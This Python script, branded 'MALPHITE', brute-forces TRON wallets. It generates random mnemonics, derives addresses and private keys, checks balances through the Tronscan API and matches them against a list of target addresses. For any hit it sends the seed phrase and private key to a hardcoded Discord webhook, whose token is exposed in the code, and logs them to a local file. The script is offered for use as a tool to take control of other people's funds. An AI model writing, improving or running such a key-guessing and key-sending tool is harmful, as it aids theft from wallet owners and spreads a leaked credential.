from hdwallet import HDWallet
from hdwallet.symbols import TRX as SYMBOL
from hdwallet.utils import generate_mnemonic, is_mnemonic
from colorama import Fore , Style , Back
from datetime import datetime
import threading
import requests
from multiprocessing import Pool
import multiprocessing
import os
import asyncio
import aiohttp

def message(title, message):
    embered = { 'title': message }
    headers = { "Content-Type": "application/json" }
    data = {'username': 'doge-scan-bot', 'avatar_url': 'https://i.imgur.com/AfFp7pu.png', 'content': str(title), 'embeds': [embered]}
    webhook_url = "https://discord.com/api/webhooks/1227910695769870446/HZIb6qMoD8V3Fu8RMCsMwLp8MnGouLuVveDKA2eA1tNPUMWU-itneoAayVXFcC3EVlwK"
    requests.post(webhook_url, json=data, headers=headers)

def timer() :
    tcx = datetime.now().time()
    return tcx

async def fetch_url(session, url):
    async with session.get(url.get('url')) as response:
        data = await response.json();
        balance = 0
        try: 
            balance = float(data.get("balances", [{"amount": "0"}])[0].get('amount'))
        except Exception as error:
            balance = -1

        return {'address': url.get('address'), 'response': {'balance': balance}}

async def call_api_urls(api_urls):
    async with aiohttp.ClientSession() as session:
        tasks = [fetch_url(session, url) for url in api_urls]
        responses = await asyncio.gather(*tasks)
        return responses

async def get_balance(wallets):
    try:
        urls = [{'url': f"https://apilist.tronscan.org/api/account?address={wallet['address']}", 'address': wallet['address']} for wallet in wallets]
        response = await call_api_urls(urls)
        return {item.get('address'): int(item.get('response').get('balance')) for item in response}
    except Exception as error:
        # print('Error: ', error)
        return {}

print('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~(MALPHITE CODING)~~~~~~~~~~~~~~~~~~~~~~~~~~\n')

r = 1
cores = 4
threads = 10

print(f"Start With: {cores} CPU Threads \n")

filename = 'trx.txt'
with open(filename) as f :
    add = f.read().split()
add = set(add)

def generate_wallets():
    wallets = []
    for r in range(threads):
        seed = generate_mnemonic()
        hdwallet: HDWallet = HDWallet(symbol = SYMBOL)
        hdwallet.from_mnemonic(mnemonic = seed)
        priv = hdwallet.private_key()
        addr = hdwallet.p2pkh_address()

        # Append the dictionary to the wallet list
        wallets.append({ "seed": seed, "address": addr, "private_key": priv })
    return wallets

async def seek(i) :
    z = 0
    w = 0

    while True :
        txx = timer()
        wallets = generate_wallets()
        balances = await get_balance(wallets)
        z += len(wallets)

        for ck in wallets:
            address = ck.get('address');
            seed = ck.get('seed');
            private_key = ck.get('private_key');
            balance = balances.get(address, 0)
            
            print(Fore.GREEN , f"[CPU{i}][C: {z} / W: {w}]", Fore.BLUE , f"{str(address)} - {str(seed)}" , Fore.RED ,' [' + str(balance) +' TRX]' , Fore.WHITE , Style.RESET_ALL)
    
            if balance > 0 or address in add:
                w += 1
                
                message('NEW TRX WALLET IS FOUND!', f"[{balance} TRX] \n Address: [{address}] \n Seed: [{seed}] \n Private: [{private_key}]")

                print(Fore.WHITE , 'Winning Wallet On Database File Imported ... [LOADED]')
                print(Fore.CYAN , 'All Details Saved On Text File Root Path ... [WRITED]')
                f = open("winner-trx.txt" , "a")
                f.write('\n' + str(address))
                f.write('\n' + str(seed))
                f.write('\n' + str(private_key))
                f.write('\n' + str(balance) + ' TRX')
                f.write('\n==========[PROGRAMMER BY MALPHITE]==========\n')
                f.close()
                print(Fore.MAGENTA , 'Information File Name ========> winner-trx.txt [OK]')
                continue
                
def run(handler, i):
    return asyncio.run(handler(i))
    
if __name__ == '__main__':
    for i in range(cores):
        p = multiprocessing.Process(target=run, args=(seek, i,))
        p.start()
